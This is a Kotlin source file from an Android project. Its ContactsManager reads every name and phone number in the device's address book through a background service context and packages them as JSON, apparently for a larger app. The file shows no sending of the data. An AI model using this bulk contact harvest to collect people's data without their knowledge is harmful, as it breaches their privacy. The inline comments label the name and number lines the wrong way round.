package com.neaking

import android.annotation.SuppressLint
import org.json.JSONObject
import org.json.JSONArray
import android.provider.ContactsContract
import org.json.JSONException

object ContactsManager {
    @SuppressLint("Range")
    fun getContacts(): Any? {
        try {
            val contacts = JSONObject()
            val list = JSONArray()
            val cur = MainService.getContextOfApplication()!!.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            while (cur!!.moveToNext()) {
                val contact = JSONObject()
                val name =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) // for  number
                val num =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) // for name
                contact.put("phoneNo", num)
                contact.put("name", name)
                list.put(contact)
            }
            contacts.put("contactsList", list)
            return contacts
        } catch (e: JSONException) {
            e.printStackTrace()
        }
        return null
    }

}